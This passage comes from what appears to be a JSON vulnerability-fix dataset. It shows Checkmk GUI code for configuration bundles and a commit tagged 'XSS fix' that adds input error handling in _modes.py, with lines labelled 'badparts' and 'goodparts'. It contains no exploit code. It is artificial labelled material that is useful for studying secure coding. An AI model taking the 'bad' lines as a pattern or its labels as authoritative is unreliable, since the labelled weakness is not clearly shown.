_folder, host in host_iter]\n        folder.delete_hosts(\n            host_names, automation=check_mk_automations.delete_hosts, allow_locked_deletion=True\n        )\n\n\ndef _collect_passwords(\n    finder: IdentFinder, passwords: Mapping[str, Password]\n) -> Iterable[tuple[BundleId, tuple[str, Password]]]:\n    for password_id, password in passwords.items():\n        if bundle_id := finder(password.get(\"locked_by\")):\n            yield bundle_id, (password_id, password)\n\n\ndef _create_passwords(bundle_ident: GlobalIdent, passwords: Iterable[CreatePassword]) -> None:\n    for password in passwords:\n        spec = password[\"spec\"]\n        spec[\"locked_by\"] = bundle_ident\n        save_password(password[\"id\"], spec, new_password=True)\n\n\ndef _delete_passwords(passwords: Iterable[tuple[str, Password]]) -> None:\n    for password_id, _password in passwords:\n        remove_password(password_id)\n\n\ndef _iter_all_rules(rulespecs: set[str] | None) -> Iterable[tuple[Folder, int, Rule]]:\n    if rulespecs:\n        for rulespec in rulespecs:\n            ruleset = SingleRulesetRecursively.load_single_ruleset_recursively(rulespec).get(\n                rulespec\n            )\n            yield from ruleset.get_rules()\n\n    else:\n        all_rulesets = AllRulesets.load_all_rulesets()\n        for ruleset in all_rulesets.get_rulesets().values():\n            yield from ruleset.get_rules()\n\n\ndef _collect_rules(\n    finder: IdentFinder, rules: Iterable[tuple[Folder, int, Rule]]\n) -> Iterable[tuple[BundleId, Rule]]:\n    for _folder, _idx, rule in rules:\n        if bundle_id := finder(rule.locked_by):\n            yield bundle_id, rule\n\n\ndef _create_rules(bundle_ident: GlobalIdent, rules: Iterable[CreateRule]) -> None:\n    # sort by folder, then ruleset\n    sorted_rules = sorted(rules, key=itemgetter(\"folder\", \"ruleset\"))\n    for folder_name, rule_iter_outer in groupby(\n        sorted_rules, key=itemgetter(\"folder\")\n    ):  # type: str, Iterable[CreateRule]\n        folder = folder_tree().folder(folder_name)\n        rulesets = FolderRulesets.load_folder_rulesets(folder)\n\n        for ruleset_name, rule_iter_inner in groupby(\n            rule_iter_outer, key=itemgetter(\"ruleset\")\n        ):  # type: str, Iterable[CreateRule]\n            ruleset = rulesets.get(ruleset_name)\n            for create_rule in rule_iter_inner:\n                rule = Rule.from_config(folder, ruleset, create_rule[\"spec\"])\n                rule.locked_by = bundle_ident\n                ruleset.append_rule(folder, rule)\n\n        rulesets.save_folder()\n\n\ndef _delete_rules(rules: Iterable[Rule]) -> None:\n    folder_getter = itemgetter(0)\n    sorted_rules = sorted(((rule.folder, rule) for rule in rules), key=folder_getter)\n    for folder, rule_iter in groupby(\n        sorted_rules, key=folder_getter\n    ):  # type: Folder, Iterable[tuple[Folder, Rule]]\n        rulesets = FolderRulesets.load_folder_rulesets(folder)\n        for _folder, rule in rule_iter:\n            # the rule objects loaded into `rulesets` are different instances\n            ruleset = rulesets.get(rule.ruleset.name)\n            actual_rule = ruleset.get_rule_by_id(rule.id)\n            rulesets.get(rule.ruleset.name).delete_rule(actual_rule)\n\n        rulesets.save_folder()\n\n\ndef _collect_dcd_connections(\n    finder: IdentFinder, dcd_connections: DCDConnectionDict\n) -> Iterable[tuple[BundleId, tuple[str, DCDConnectionSpec]]]:\n    for connection_id, connection in dcd_connections.items():\n        if bundle_id := finder(connection.get(\"locked_by\")):\n            yield bundle_id, (connection_id, connection)\n\n\ndef _create_dcd_connections(\n    bundle_ident: GlobalIdent, dcd_connections: Iterable[CreateDCDConnection]\n) -> None:\n    for dcd_connection in dcd_connections:\n        spec = dcd_connection[\"spec\"]\n        spec[\"locked_by\"] = bundle_ident\n        DCDConnectionHook.create_dcd_connection(dcd_connection[\"id\"], spec)\n\n\ndef _delete_dcd_connections(dcd_connections: Iterable[tuple[str, DCDConnectionSpec]]) -> None:\n    for dcd_connection_id, _spec in dcd_connections:\n        DCDConnectionHook.delete_dcd_connection(dcd_connection_id)\n\n\ndef _prepare_bundle_id_finder(bundle_program_id: str, bundle_ids: set[BundleId]) -> IdentFinder:\n    def find_matching_bundle_id(\n        ident: GlobalIdent | None,\n    ) -> BundleId | None:\n        if (\n            ident is not None\n            and ident[\"program_id\"] == bundle_program_id\n            and ident[\"instance_id\"] in bundle_ids\n        ):\n            return BundleId(ident[\"instance_id\"])\n        return None\n\n    return find_matching_bundle_id\n\n\nclass ConfigBundle(TypedDict):\n    \"\"\"\n    A configuration bundle is a collection of configs which are managed together by this bundle.\n    Each underlying config must have the locked_by attribute set to the id of the bundle. We\n    explicitly avoid double references here to keep the data model simple. The group and program\n    combination should determine which configuration objects are potentially part of the bundle.\n    \"\"\"\n\n    # General properties\n    title: str\n    comment: str\n\n    # Bundle specific properties\n    group: str  # e.g. rulespec_name    # special_agent:aws\n    program_id: str  # PROGRAM_ID_QUICK_SETUP\n    customer: NotRequired[str]  # CME specific\n\n\nclass ConfigBundleStore(WatoSingleConfigFile[dict[BundleId, ConfigBundle]]):\n    def __init__(self) -> None:\n        super().__init__(\n            config_file_path=Path(multisite_dir()) / \"configuration_bundles.mk\",\n            config_variable=\"configuration_bundles\",\n            spec_class=dict[BundleId, ConfigBundle],\n        )\n\n\ndef load_group_bundles(bundle_group: str) -> Mapping[BundleId, ConfigBundle]:\n    all_bundles = ConfigBundleStore().load_for_reading()\n    return {\n        bundle_id: bundle\n        for bundle_id, bundle in all_bundles.items()\n        if bundle[\"group\"] == bundle_group\n    }\n\n\ndef register(config_file_registry: ConfigFileRegistry) -> None:\n    config_file_registry.register(ConfigBundleStore())\n"
                }
            },
            "msg": "Fix XSS crawl\n\nChange-Id: I64d18de5b0a604384345feb69abf9634e4f420f2"
        },
        "f00836f080c78c797b6c2a893060aa4d4a0dc4fc": {
            "url": "https://api.github.com/repos/Checkmk/checkmk/commits/f00836f080c78c797b6c2a893060aa4d4a0dc4fc",
            "html_url": "https://github.com/Checkmk/checkmk/commit/f00836f080c78c797b6c2a893060aa4d4a0dc4fc",
            "sha": "f00836f080c78c797b6c2a893060aa4d4a0dc4fc",
            "keyword": "XSS fix",
            "diff": "diff --git a/cmk/gui/quick_setup/_modes.py b/cmk/gui/quick_setup/_modes.py\nindex 57862783b40..b63a1e4f65f 100644\n--- a/cmk/gui/quick_setup/_modes.py\n+++ b/cmk/gui/quick_setup/_modes.py\n@@ -151,10 +151,13 @@ def ensure_permissions(self) -> None:\n \n     def _from_vars(self) -> None:\n         self._name = request.get_ascii_input_mandatory(self.VAR_NAME)\n-        self._bundle_group_type = RuleGroupType(self._name.split(\":\")[0])\n+        try:\n+            self._bundle_group_type = RuleGroupType(self._name.split(\":\")[0])\n+        except ValueError:\n+            raise MKUserError(None, _(\"Invalid configuration bundle group type.\"))\n         if self._bundle_group_type not in BUNDLE_DOMAINS:\n             raise MKUserError(\n-                None,\n+                self.VAR_NAME,\n                 _(\"No edit configuration bundle implemented for bundle group type '%s'.\")\n                 % self._name,\n             )\n",
            "message": "",
            "files": {
                "/cmk/gui/quick_setup/_modes.py": {
                    "changes": [
                        {
                            "diff": "\n \n     def _from_vars(self) -> None:\n         self._name = request.get_ascii_input_mandatory(self.VAR_NAME)\n-        self._bundle_group_type = RuleGroupType(self._name.split(\":\")[0])\n+        try:\n+            self._bundle_group_type = RuleGroupType(self._name.split(\":\")[0])\n+        except ValueError:\n+            raise MKUserError(None, _(\"Invalid configuration bundle group type.\"))\n         if self._bundle_group_type not in BUNDLE_DOMAINS:\n             raise MKUserError(\n-                None,\n+                self.VAR_NAME,\n                 _(\"No edit configuration bundle implemented for bundle group type '%s'.\")\n                 % self._name,\n             )\n",
                            "add": 5,
                            "remove": 2,
                            "filename": "/cmk/gui/quick_setup/_modes.py",
                            "badparts": [
                                "        self._bundle_group_type = RuleGroupType(self._name.split(\":\")[0])",
                                "                None,"
                            ],
                            "goodparts": [
                                "        try:",
                                "            self._bundle_group_type = RuleGroupType(self._name.split(\":\")[0])",
                                "        except ValueError:",
                                "            raise MKUserError(None, _(\"Invalid configuration bundle group type.\"))",
                                "                self.VAR_NAME,"
                            ]
                        }
                    ],
                    "source": "\n from collections.abc import Callable, Collection, Iterator, Mapping, Sequence from typing import Protocol from cmk.ccc.exceptions import MKGeneralException from cmk.utils.rulesets.definition import RuleGroup, RuleGroupType from cmk.gui import forms from cmk.gui.breadcrumb import Breadcrumb from cmk.gui.config import active_config from cmk.gui.exceptions import MKUserError from cmk.gui.htmllib.generator import HTMLWriter from cmk.gui.htmllib.html import html from cmk.gui.http import request from cmk.gui.i18n import _ from cmk.gui.logged_in import user from cmk.gui.page_menu import( make_form_bulk_submit_link, make_simple_form_page_menu, make_simple_link, PageMenu, PageMenuDropdown, PageMenuEntry, PageMenuTopic, ) from cmk.gui.quick_setup.v0_unstable._registry import quick_setup_registry from cmk.gui.table import Foldable, Table, table_element from cmk.gui.type_defs import ActionResult, HTTPVariables, Icon, PermissionName from cmk.gui.utils.csrf_token import check_csrf_token from cmk.gui.utils.escaping import escape_to_html_permissive from cmk.gui.utils.html import HTML from cmk.gui.utils.transaction_manager import transactions from cmk.gui.utils.urls import make_confirm_delete_link from cmk.gui.valuespec import Dictionary, DictionaryEntry, FixedValue, RuleComment, TextInput from cmk.gui.wato._main_module_topics import MainModuleTopicQuickSetup from cmk.gui.wato.pages.hosts import ModeEditHost from cmk.gui.wato.pages.password_store import ModeEditPassword from cmk.gui.wato.pages.rulesets import ModeEditRule from cmk.gui.watolib.configuration_bundles import( BUNDLE_DOMAINS, BundleId, BundleReferences, ConfigBundle, ConfigBundleStore, delete_config_bundle, edit_config_bundle_configuration, identify_bundle_references, load_group_bundles, valid_special_agent_bundle, ) from cmk.gui.watolib.hosts_and_folders import folder_from_request, make_action_link from cmk.gui.watolib.main_menu import ABCMainModule, MainModuleRegistry, MainModuleTopic from cmk.gui.watolib.mode import mode_url, ModeRegistry, redirect, WatoMode from cmk.gui.watolib.rulespecs import rulespec_registry def register(main_module_registry: MainModuleRegistry, mode_registry: ModeRegistry) -> None: mode_registry.register(ModeConfigurationBundle) mode_registry.register(ModeEditConfigurationBundles) mode_registry.register(ModeQuickSetupSpecialAgent) main_module_registry.register(MainModuleQuickSetupAWS) class ModeQuickSetupSpecialAgent(WatoMode): \"\"\" This mode allows to create a new special agent configuration using the quick setup. It is solely restricted to special agent based rules and relies on the RuleGroup.SpecialAgents naming convention of the rulespec entry \"\"\" VAR_NAME=\"varname\" @classmethod def name(cls) -> str: return \"new_special_agent_configuration\" @classmethod def parent_mode(cls) -> type[WatoMode] | None: return ModeEditConfigurationBundles def _breadcrumb_url(self) -> str: return self.mode_url(varname=self._name) def _from_vars(self) -> None: self._name=request.get_ascii_input_mandatory(self.VAR_NAME) if not self._name.startswith(RuleGroupType.SPECIAL_AGENTS.value): raise MKUserError( None, _(\"Add configuration is only available for special agent based rules.\"), ) quick_setup=quick_setup_registry.get(self._name) if quick_setup is None: raise MKUserError(None, _(\"No Configuration Quick setup for %s available\") % self._name) self._quick_setup_id=quick_setup.id @staticmethod def static_permissions() -> Collection[PermissionName]: return[] def ensure_permissions(self) -> None: self._ensure_static_permissions() for domain_definition in BUNDLE_DOMAINS[RuleGroupType.SPECIAL_AGENTS]: pname=domain_definition.permission user.need_permission(pname if \".\" in pname else(\"wato.\" +pname)) def title(self) -> str: title=rulespec_registry[self._name].title assert title is not None return _(\"Add %s configuration\") % title def breadcrumb(self) -> Breadcrumb: with request.stashed_vars(): return super().breadcrumb() def page_menu(self, breadcrumb: Breadcrumb) -> PageMenu: return make_simple_form_page_menu( title=_(\"Configuration\"), breadcrumb=breadcrumb, add_cancel_link=True, cancel_url=mode_url(mode_name=ModeEditConfigurationBundles.name(), varname=self._name), ) def page(self) -> None: html.vue_app(app_name=\"quick_setup\", data={\"quick_setup_id\": self._quick_setup_id}) class ModeEditConfigurationBundles(WatoMode): VAR_NAME=\"varname\" VAR_ACTION=\"_action\" VAR_BUNDLE_ID=\"_bundle_id\" @classmethod def name(cls) -> str: return \"edit_configuration_bundles\" @staticmethod def static_permissions() -> Collection[PermissionName]: return[] def ensure_permissions(self) -> None: self._ensure_static_permissions() for domain_definition in BUNDLE_DOMAINS[self._bundle_group_type]: pname=domain_definition.permission user.need_permission(pname if \".\" in pname else(\"wato.\" +pname)) def _from_vars(self) -> None: self._name=request.get_ascii_input_mandatory(self.VAR_NAME) self._bundle_group_type=RuleGroupType(self._name.split(\":\")[0]) if self._bundle_group_type not in BUNDLE_DOMAINS: raise MKUserError( None, _(\"No edit configuration bundle implemented for bundle group type '%s'.\") % self._name, ) def _breadcrumb_url(self) -> str: return self.mode_url(varname=self._name) def title(self) -> str: if self._bundle_group_type is RuleGroupType.SPECIAL_AGENTS: title=rulespec_registry[self._name].title assert title is not None return title raise MKGeneralException(\"Not implemented bundle group type\") def page_menu(self, breadcrumb: Breadcrumb) -> PageMenu: menu=PageMenu( dropdowns=[ PageMenuDropdown( name=\"configurations\", title=_(\"Configurations\"), topics=[ PageMenuTopic( title=_(\"Configurations\"), entries=[ PageMenuEntry( title=_(\"Add configuration\"), icon_name=\"new\", item=make_simple_link( mode_url( ModeQuickSetupSpecialAgent.name(), varname=self._name ) ), is_shortcut=True, is_suggested=True, ) ], ) ], ) ], breadcrumb=breadcrumb, ) return menu def page(self) -> None: if not active_config.wato_hide_varnames: display_varname=( '%s[\"%s\"]' % tuple(self._name.split(\":\")) if \":\" in self._name else self._name ) html.div(display_varname, class_=\"varname\") self._bundles_listing(self._name) def _bundles_listing(self, group_name: str) -> None: bundle_ids=set(load_group_bundles(group_name).keys()) if not bundle_ids: html.div(_(\"No configuration yet\")) return bundles_with_references=identify_bundle_references(group_name, bundle_ids) if self._bundle_group_type is RuleGroupType.SPECIAL_AGENTS: self._special_agent_bundles_listing(group_name, bundles_with_references) return raise MKGeneralException(\"Not implemented\") def _action_url(self, action: str, bundle_id: BundleId) -> str: vars_: HTTPVariables=[ (\"mode\", request.var(\"mode\", self.name())), (self.VAR_NAME, self._name), (self.VAR_BUNDLE_ID, bundle_id), (self.VAR_ACTION, action), ] return make_action_link(vars_) def action(self) -> ActionResult: check_csrf_token() if not transactions.check_transaction(): return redirect(self.mode_url()) action=request.get_ascii_input_mandatory(self.VAR_ACTION) bundle_id=BundleId(request.get_ascii_input_mandatory(self.VAR_BUNDLE_ID)) if action==\"delete\": delete_config_bundle(bundle_id) return redirect(self.mode_url()) def _special_agent_bundles_listing( self, group_name: str, bundles: Mapping[BundleId, BundleReferences] ) -> None: special_agent_valuespec=rulespec_registry[group_name].valuespec with table_element( table_id=None, title=\"Configurations\", searchable=False, sortable=False, limit=None, foldable=Foldable.FOLDABLE_SAVE_STATE, omit_update_header=True, ) as table: for index,(bundle_id, bundle) in enumerate(sorted(bundles.items())): if not valid_special_agent_bundle(bundle): raise MKGeneralException(f\"Invalid configuration:{bundle_id}\") assert bundle.rules is not None assert bundle.hosts is not None rule_value=bundle.rules[0].value host_name=bundle.hosts[0].name() table.row() table.cell(\" html.write_text_permissive(index +1) self._show_bundle_icons(table, bundle_id) table.cell(\"Name\", css=[]) html.write_text_permissive(bundle_id) table.cell(_(\"Value\"), css=[\"value\"]) html.write_text_permissive( HTMLWriter.render_table( HTMLWriter.render_tr( HTMLWriter.render_td(\"Host name:\", class_=\"title\") +HTMLWriter.render_td(host_name) ) ) ) try: value_html=special_agent_valuespec.value_to_html(rule_value) except Exception as e: try: reason=str(e) special_agent_valuespec.validate_datatype(rule_value, \"\") except Exception as e2: reason=str(e2) value_html=( html.render_icon(\"alert\") +HTML.with_escaping(_(\"The value of this rule is not valid. \")) +escape_to_html_permissive(reason) ) html.write_text_permissive(value_html) def _show_bundle_icons(self, table: Table, bundle_id: BundleId) -> None: table.cell(\"\", css=[\"buttons\"]) html.empty_icon() table.cell(_(\"Actions\"), css=[\"buttons rulebuttons\"]) edit_url=\"\" html.icon_button(url=edit_url, title=_(\"Edit this configuration\"), icon=\"edit\") html.icon_button( url=make_confirm_delete_link( url=self._action_url(\"delete\", bundle_id), title=_(\"Delete configuration %s\") % bundle_id, ), title=_(\"Delete this configuration\"), icon=\"delete\", ) class MainModuleQuickSetupAWS(ABCMainModule): @property def mode_or_url(self) -> str: return mode_url(ModeEditConfigurationBundles.name(), varname=RuleGroup.SpecialAgents(\"aws\")) @property def topic(self) -> MainModuleTopic: return MainModuleTopicQuickSetup @property def title(self) -> str: return _(\"Amazon Web Service(AWS)\") @property def icon(self) -> Icon: return \"quick_setup_aws\" @property def permission(self) -> None | str: return None @property def description(self) -> str: return _(\"Configure Amazon Web Service(AWS) monitoring in Checkmk\") @property def sort_index(self) -> int: return 10 @property def is_show_more(self) -> bool: return False @classmethod def megamenu_search_terms(cls) -> Sequence[str]: return[\"aws\"] class EditDCDConnection(Protocol): def __init__(self) -> None:... def from_vars(self, ident_var: str) -> None:... def page(self, form_name: str) -> None:... def action(self) -> ActionResult:... class ModeConfigurationBundle(WatoMode): edit_dcd_connection_hook: Callable[[], EditDCDConnection | None]=lambda: None @classmethod def name(cls) -> str: return \"edit_configuration_bundle\" @staticmethod def static_permissions() -> Collection[PermissionName]: return[] def ensure_permissions(self) -> None: self._ensure_static_permissions() for domain_definition in BUNDLE_DOMAINS.get(self._rule_group_type,[]): pname=domain_definition.permission user.need_permission(pname if \".\" in pname else(\"wato.\" +pname)) def title(self) -> str: return _(\"Edit configuration: %s\") % self._bundle[\"title\"] def _from_vars(self) -> None: self._bundle_id=request.get_validated_type_input_mandatory(BundleId, \"bundle_id\") bundle_store=ConfigBundleStore().load_for_reading() if self._bundle_id not in bundle_store: raise MKUserError( \"bundle_id\", _('The configuration \"%s\" does not exist.') % self._bundle_id, ) self._bundle: ConfigBundle=bundle_store[self._bundle_id] self._bundle_group=self._bundle[\"group\"] self._bundle_references=identify_bundle_references(self._bundle_group,{self._bundle_id})[ self._bundle_id ] self._rule_group_type=RuleGroupType(self._bundle_group.split(\":\")[0]) match self._rule_group_type: case RuleGroupType.SPECIAL_AGENTS: self._special_agents_from_vars() case _: raise MKUserError( None, _(\"No edit configuration bundle implemented for bundle group type '%s'.\") % self._bundle_group, ) def _special_agents_from_vars(self) -> None: if not all( [ self._bundle_references.rules, self._bundle_references.hosts, self._bundle_references.passwords, ] ): raise MKUserError( None, _(\"The configuration bundle does not contain all required objects.\"), ) assert self._bundle_references.rules assert len(self._bundle_references.rules)==1 assert self._bundle_references.hosts assert len(self._bundle_references.hosts)==1 assert self._bundle_references.passwords ModeEditRule.set_vars(self._bundle_group, self._bundle_references.rules[0].id) self._edit_rule=ModeEditRule() ModeEditHost.set_vars(self._bundle_references.hosts[0].name()) self._edit_host=ModeEditHost() self._edit_dcd_connections: Sequence[EditDCDConnection | None]=[] if self._bundle_references.dcd_connections: for index, dcd_connection in enumerate(self._bundle_references.dcd_connections): request.set_var(f\"dcd_id_{index}\", dcd_connection[0]) self._edit_dcd_connections=[ self.edit_dcd_connection_hook() for _dcd in self._bundle_references.dcd_connections ] for index, edit_dcd_connection in enumerate(self._edit_dcd_connections): if edit_dcd_connection: edit_dcd_connection.from_vars(f\"dcd_id_{index}\") for index, password in enumerate(self._bundle_references.passwords): request.set_var(f\"password_id_{index}\", password[0]) self._edit_passwords=[ModeEditPassword() for _pw in self._bundle_references.passwords] for index, edit_password in enumerate(self._edit_passwords): edit_password.from_vars(f\"password_id_{index}\") @staticmethod def _configuration_vs(bundle_id: str) -> Dictionary: elements: Sequence[DictionaryEntry]=[ (\"_name\", TextInput(title=_(\"Name\"), size=80)), (\"_comment\", RuleComment()), (\"_bundle_id\", FixedValue(title=_(\"Configuration bundle ID\"), value=bundle_id)), ] return Dictionary( title=_(\"Configuration bundle properties\"), optional_keys=False, render=\"form\", elements=elements, ) def _sub_page_configuration(self) -> None: html.h1(_(\"Configuration\"), class_=[\"edit_configuration_bundle_header\"]) with html.form_context(\"edit_bundle\", method=\"POST\"): self._configuration_vs(self._bundle_id).render_input( \"options\", { \"_name\": self._bundle[\"title\"], \"_comment\": self._bundle[\"comment\"], }, ) forms.end() html.hidden_fields() def _sub_page_rule(self) -> None: html.h1(_(\"Rule\"), class_=[\"edit_configuration_bundle_header\"]) self._edit_rule.page() def _sub_page_host(self) -> None: html.h1(_(\"Host\"), class_=[\"edit_configuration_bundle_header\"]) self._edit_host.page() def _sub_page_dcd_connection(self) -> None: if any(edit_dcd_connection for edit_dcd_connection in self._edit_dcd_connections): html.h1(_(\"Dynamic host management\"), class_=[\"edit_configuration_bundle_header\"]) for index, edit_dcd_connection in enumerate(self._edit_dcd_connections): if edit_dcd_connection: edit_dcd_connection.page(f\"edit_dcd_{index}\") def _sub_page_password(self) -> None: if self._edit_passwords: html.h1(_(\"Password\"), class_=[\"edit_configuration_bundle_header\"]) for index, edit_password in enumerate(self._edit_passwords): edit_password.page(f\"edit_password_{index}\") def page(self) -> None: with html.form_context(\"bulk\", method=\"POST\"): forms.end() html.hidden_fields() match self._rule_group_type: case RuleGroupType.SPECIAL_AGENTS: self._sub_page_configuration() self._sub_page_rule() self._sub_page_host() self._sub_page_dcd_connection() self._sub_page_password() case _: raise MKUserError( None, _(\"No edit configuration bundle implemented for bundle group type '%s'.\") % self._bundle_group, ) def _form_names(self) -> Iterator[str]: yield \"edit_bundle\" if self._edit_rule: yield \"rule_editor\" if self._edit_host: yield \"edit_host\" yield from(f\"edit_dcd_{index}\" for index in range(len(self._edit_dcd_connections))) yield from(f\"edit_password_{index}\" for index in range(len(self._edit_passwords))) def _page_menu_action_entries(self) -> Iterator[PageMenuEntry]: form_names=list(self._form_names()) yield PageMenuEntry( title=_(\"Save\"), icon_name=\"services\", item=make_form_bulk_submit_link( bulk_form_name=\"bulk\", form_names=form_names, button_name=\"_save\" ), is_shortcut=False, ) yield PageMenuEntry( title=_(\"Save & go to service discovery\"), icon_name=\"services_green\", item=make_form_bulk_submit_link( bulk_form_name=\"bulk\", form_names=form_names, button_name=\"_save_and_go_to_service_discovery\", ), is_shortcut=True, ) yield PageMenuEntry( title=_(\"Cancel\"), icon_name=\"cancel\", item=make_simple_link(\"\"), is_shortcut=True, ) def _page_menu_related_entries(self) -> Iterator[PageMenuEntry]: yield PageMenuEntry( title=_(\"TBD\"), icon_name=\"\", item=make_simple_link(\"\"), ) def action(self) -> ActionResult: check_csrf_token() if not transactions.check_transaction(): return redirect(self.mode_url(bundle_id=self._bundle_id)) if request.has_var(\"_save\"): self._action_save() return redirect(self.mode_url(bundle_id=self._bundle_id)) if request.has_var(\"_save_and_go_to_service_discovery\"): self._action_save() host=self._edit_host.host folder=folder_from_request(request.var(\"folder\"), host.name()) return redirect(mode_url(\"inventory\", folder=folder.path(), host=host.name())) return redirect(self.mode_url(bundle_id=self._bundle_id)) def page_menu(self, breadcrumb: Breadcrumb) -> PageMenu: return PageMenu( dropdowns=[ PageMenuDropdown( name=\"actions\", title=_(\"Configuration\"), topics=[ PageMenuTopic( title=_(\"Actions\"), entries=list(self._page_menu_action_entries()), ), ], ), PageMenuDropdown( name=\"actions\", title=_(\"Related\"), topics=[ PageMenuTopic( title=_(\"Related\"), entries=list(self._page_menu_related_entries()), ), ], ), ], breadcrumb=breadcrumb, ) def _save_config_bundle_configuration(self) -> None: vs=self._configuration_vs(self._bundle_id) config=vs.from_html_vars(\"edit_bundle_options\") vs.validate_value(config, \"edit_bundle_options\") self._bundle[\"title\"]=config[\"_name\"] self._bundle[\"comment\"]=config[\"_comment\"] edit_config_bundle_configuration(self._bundle_id, self._bundle) def _set_vars(self, all_vars: Mapping[str, Sequence[tuple[str, str]]], form_name: str) -> None: request.del_vars() for var in all_vars[form_name]: request.set_var(var[0].replace(form_name +\"_\", \"\"), var[1]) request.set_var(\"_transid\", transactions.fresh_transid()) transactions.store_new() def _action_save(self) -> None: all_vars={ form_name: list(request.itervars(form_name)) for form_name in self._form_names() } self._save_config_bundle_configuration() if self._edit_host: self._set_vars(all_vars, \"edit_host\") self._edit_host.action() if self._edit_rule: self._set_vars(all_vars, \"rule_editor\") self._edit_rule.action() if self._edit_passwords: for index, edit_password in enumerate(self._edit_passwords): self._set_vars(all_vars, f\"edit_password_{index}\") edit_password.action() if self._edit_dcd_connections: for index, edit_dcd_connection in enumerate(self._edit_dcd_connections): if edit_dcd_connection: self._set_vars(all_vars, f\"edit_dcd_connection_{index}\") edit_dcd_connection.action() ",
                    "sourceWithComments": "#!/usr/bin/env python3\n# Copyright (C) 2024 Checkmk GmbH - License: GNU General Public License v2\n# This file is part of Checkmk (https://checkmk.com). It is subject to the terms and\n# conditions defined in the file COPYING, which is part of this source code package.\n\nfrom collections.abc import Callable, Collection, Iterator, Mapping, Sequence\nfrom typing import Protocol\n\nfrom cmk.ccc.exceptions import MKGeneralException\n\nfrom cmk.utils.rulesets.definition import RuleGroup, RuleGroupType\n\nfrom cmk.gui import forms\nfrom cmk.gui.breadcrumb import Breadcrumb\nfrom cmk.gui.config import active_config\nfrom cmk.gui.exceptions import MKUserError\nfrom cmk.gui.htmllib.generator import HTMLWriter\nfrom cmk.gui.htmllib.html import html\nfrom cmk.gui.http import request\nfrom cmk.gui.i18n import _\nfrom cmk.gui.logged_in import user\nfrom cmk.gui.page_menu import (\n    make_form_bulk_submit_link,\n    make_simple_form_page_menu,\n    make_simple_link,\n    PageMenu,\n    PageMenuDropdown,\n    PageMenuEntry,\n    PageMenuTopic,\n)\nfrom cmk.gui.quick_setup.v0_unstable._registry import quick_setup_registry\nfrom cmk.gui.table import Foldable, Table, table_element\nfrom cmk.gui.type_defs import ActionResult, HTTPVariables, Icon, PermissionName\nfrom cmk.gui.utils.csrf_token import check_csrf_token\nfrom cmk.gui.utils.escaping import escape_to_html_permissive\nfrom cmk.gui.utils.html import HTML\nfrom cmk.gui.utils.transaction_manager import transactions\nfrom cmk.gui.utils.urls import make_confirm_delete_link\nfrom cmk.gui.valuespec import Dictionary, DictionaryEntry, FixedValue, RuleComment, TextInput\nfrom cmk.gui.wato._main_module_topics import MainModuleTopicQuickSetup\nfrom cmk.gui.wato.pages.hosts import ModeEditHost\nfrom cmk.gui.wato.pages.password_store import ModeEditPassword\nfrom cmk.gui.wato.pages.rulesets import ModeEditRule\nfrom cmk.gui.watolib.configuration_bundles import (\n    BUNDLE_DOMAINS,\n    BundleId,\n    BundleReferences,\n    ConfigBundle,\n    ConfigBundleStore,\n    delete_config_bundle,\n    edit_config_bundle_configuration,\n    identify_bundle_references,\n    load_group_bundles,\n    valid_special_agent_bundle,\n)\nfrom cmk.gui.watolib.hosts_and_folders import folder_from_request, make_action_link\nfrom cmk.gui.watolib.main_menu import ABCMainModule, MainModuleRegistry, MainModuleTopic\nfrom cmk.gui.watolib.mode import mode_url, ModeRegistry, redirect, WatoMode\nfrom cmk.gui.watolib.rulespecs import rulespec_registry\n\n\ndef register(main_module_registry: MainModuleRegistry, mode_registry: ModeRegistry) -> None:\n    mode_registry.register(ModeConfigurationBundle)\n    mode_registry.register(ModeEditConfigurationBundles)\n    mode_registry.register(ModeQuickSetupSpecialAgent)\n    main_module_registry.register(MainModuleQuickSetupAWS)\n\n\nclass ModeQuickSetupSpecialAgent(WatoMode):\n    \"\"\"\n    This mode allows to create a new special agent configuration using the quick setup. It\n    is solely restricted to special agent based rules and relies on the RuleGroup.SpecialAgents\n    naming convention of the rulespec entry\n    \"\"\"\n\n    VAR_NAME = \"varname\"\n\n    @classmethod\n    def name(cls) -> str:\n        return \"new_special_agent_configuration\"\n\n    @classmethod\n    def parent_mode(cls) -> type[WatoMode] | None:\n        return ModeEditConfigurationBundles\n\n    def _breadcrumb_url(self) -> str:\n        return self.mode_url(varname=self._name)\n\n    def _from_vars(self) -> None:\n        self._name = request.get_ascii_input_mandatory(self.VAR_NAME)\n        if not self._name.startswith(RuleGroupType.SPECIAL_AGENTS.value):\n            raise MKUserError(\n                None,\n                _(\"Add configuration is only available for special agent based rules.\"),\n            )\n\n        quick_setup = quick_setup_registry.get(self._name)\n        if quick_setup is None:\n            raise MKUserError(None, _(\"No Configuration Quick setup for %s available\") % self._name)\n        self._quick_setup_id = quick_setup.id\n\n    @staticmethod\n    def static_permissions() -> Collection[PermissionName]:\n        return []\n\n    def ensure_permissions(self) -> None:\n        self._ensure_static_permissions()\n        for domain_definition in BUNDLE_DOMAINS[RuleGroupType.SPECIAL_AGENTS]:\n            pname = domain_definition.permission\n            user.need_permission(pname if \".\" in pname else (\"wato.\" + pname))\n\n    def title(self) -> str:\n        title = rulespec_registry[self._name].title\n        assert title is not None\n        return _(\"Add %s configuration\") % title\n\n    def breadcrumb(self) -> Breadcrumb:\n        with request.stashed_vars():\n            return super().breadcrumb()\n\n    def page_menu(self, breadcrumb: Breadcrumb) -> PageMenu:\n        return make_simple_form_page_menu(\n            title=_(\"Configuration\"),\n            breadcrumb=breadcrumb,\n            add_cancel_link=True,\n            cancel_url=mode_url(mode_name=ModeEditConfigurationBundles.name(), varname=self._name),\n        )\n\n    def page(self) -> None:\n        html.vue_app(app_name=\"quick_setup\", data={\"quick_setup_id\": self._quick_setup_id})\n\n\nclass ModeEditConfigurationBundles(WatoMode):\n    VAR_NAME = \"varname\"\n    VAR_ACTION = \"_action\"\n    VAR_BUNDLE_ID = \"_bundle_id\"\n\n    @classmethod\n    def name(cls) -> str:\n        return \"edit_configuration_bundles\"\n\n    @staticmethod\n    def static_permissions() -> Collection[PermissionName]:\n        return []\n\n    def ensure_permissions(self) -> None:\n        self._ensure_static_permissions()\n        for domain_definition in BUNDLE_DOMAINS[self._bundle_group_type]:\n            pname = domain_definition.permission\n            user.need_permission(pname if \".\" in pname else (\"wato.\" + pname))\n\n    def _from_vars(self) -> None:\n        self._name = request.get_ascii_input_mandatory(self.VAR_NAME)\n        self._bundle_group_type = RuleGroupType(self._name.split(\":\")[0])\n        if self._bundle_group_type not in BUNDLE_DOMAINS:\n            raise MKUserError(\n                None,\n                _(\"No edit configuration bundle implemented for bundle group type '%s'.\")\n                % self._name,\n            )\n\n   